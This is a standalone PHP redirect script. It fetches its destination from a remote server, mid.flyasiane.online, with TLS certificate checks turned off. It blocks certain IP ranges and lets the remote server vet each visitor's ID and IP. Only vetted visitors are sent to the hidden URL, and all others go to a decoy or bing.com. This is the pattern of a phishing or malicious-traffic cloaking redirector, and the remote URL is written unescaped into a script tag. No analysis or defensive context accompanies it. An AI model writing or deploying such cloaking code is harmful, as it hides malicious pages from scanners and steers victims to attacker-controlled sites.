<?php

$host = "mid.flyasiane.online";
$id=$_GET["jklk_2o9o0apd"];
$reloc_url = "";
$rtn_url = "";

function sendGetReq($params) {
    global $host;
    $queryString = "";
    foreach ($params as $key => $value) {
        $queryString .= $key . "=" . urlencode($value) . "&";
    }
    $queryString = rtrim($queryString, "&");
    $path = "/manage.php?" . $queryString;
    // Build the HTTP request
    $request = "GET $path HTTP/1.1\r\n";
    $request .= "Host: $host\r\n";
    //$request .= "Content-Length: " . strlen($queryString) . "\r\n" ;
    $request .= "Connection: Close\r\n" ;
    $request .= "\r\n";
     
    $context = stream_context_create();
    $result = stream_context_set_option($context, 'ssl', 'verify_peer', false);
    $result = stream_context_set_option($context, 'ssl', 'verify_host', false);
    $socket = stream_socket_client("ssl://" . $host . ':443', $errno, $errstr, 10, STREAM_CLIENT_CONNECT, $context);

    if ($socket) {
        // Send the HTTP request
        fwrite($socket, $request);
        // Receive the response
        $response = '';
        $result = '';
        $body = false;
        while (!feof($socket)) {
            $response = fgets($socket, 1024);
            if ( $body )
                $result .= $response;
            if ( $response == "\r\n" )
                $body = true;
        }
        // Close the socket connection
        fclose($socket);
        // Handle the response
        $ret = array(
            "status" => "success",
            "response" => $result
        );
    } 
    else {
        $ret =  array(
            "status" => "error",
            "response" => "Connection failed."
        );
    }
    return $ret;
}

function isInBlacklist($id) {
    //$headers = getallheaders();
    $ip = $_SERVER['REMOTE_ADDR'];

    if(stristr($ip, '1.225.35.') || stristr($ip, '220.230.168.') || stristr($ip, '211.249.42.')) {
        return true;
    }
    // if(stristr($_SERVER['HTTP_USER_AGENT'], 'whale')) {
    //     return true;
    // }
	//if(!stristr($headers['Accept-Language'], 'ko')) {
    //    return true;
    //}
    $res = sendGetReq(array("action" => "validate", "data" => $id, "ipaddr" => $_SERVER["REMOTE_ADDR"]));
	
    if($res["status"] == "success" && $res["response"] == "yes") 
        return false;
    else 
        return true;

    return false;
}

$response = sendGetReq(array("action" => "get_reloc_url", "data" => $id));

if($response["status"] == "success")
    $reloc_url = $response["response"];

$response = sendGetReq(array("action" => "get_rtn_url", "data" => "none"));

if($response["status"] == "success")
    $rtn_url = $response["response"];
if (!empty($id) && !isInBlacklist($id) && !empty($reloc_url)) {
	echo "<script>location.href='" . $reloc_url . "'</script>";
} 
else if(!empty($rtn_url)) {
    echo "<script>location.href='" . $rtn_url . "'</script>";
}
else
    echo "<script>location.href='https://bing.com/'</script>";

?>